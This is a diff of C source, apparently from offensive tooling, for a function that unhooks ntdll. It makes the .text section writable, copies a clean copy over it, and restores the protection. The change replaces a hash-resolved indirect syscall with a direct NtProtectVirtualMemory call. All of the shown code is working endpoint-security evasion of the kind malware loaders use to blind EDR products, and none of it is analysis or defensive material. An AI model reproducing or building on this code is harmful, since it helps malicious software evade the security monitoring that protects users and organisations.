@@ -74,15 +74,10 @@ BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
 	DebugPrint("[i] Replacing The Text Section ... ");
 	DWORD dwOldProtection = 0;
 
-#ifdef HW_INDIRECT_SYSCALL
+#ifdef SYSCALL_ENABLED
 	NTSTATUS status = 0;
-	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrepareSyscallHash(NtProtectVirtualMemory_JOAA);
-	if (!pNtProtectVirtualMemory) {
-		DebugPrint("[-] Failed to prepare syscall for NtProtectVirtualMemory.\n");
-		return -2;
-	}
 
-	status = pNtProtectVirtualMemory(GetCurrentProcess(), &pLocalNtdllTxt, &sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection);
+	status = NtProtectVirtualMemory(GetCurrentProcess(), &pLocalNtdllTxt, &sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection);
 	if (!NT_SUCCESS(status)) {
 		DebugPrint("[!] NtProtectVirtualMemory (WRITE) Failed with NTSTATUS: 0x%08X\n", status);
 		return FALSE;
@@ -90,7 +85,7 @@ BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
 
 	_memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
 
-	status = pNtProtectVirtualMemory(GetCurrentProcess(), &pLocalNtdllTxt, &sNtdllTxtSize, dwOldProtection, &dwOldProtection);
+	status = NtProtectVirtualMemory(GetCurrentProcess(), &pLocalNtdllTxt, &sNtdllTxtSize, dwOldProtection, &dwOldProtection);
 	if (!NT_SUCCESS(status)) {
 		DebugPrint("[!] NtProtectVirtualMemory (RESTORE) Failed with NTSTATUS: 0x%08X\n", status);
 		return FALSE;
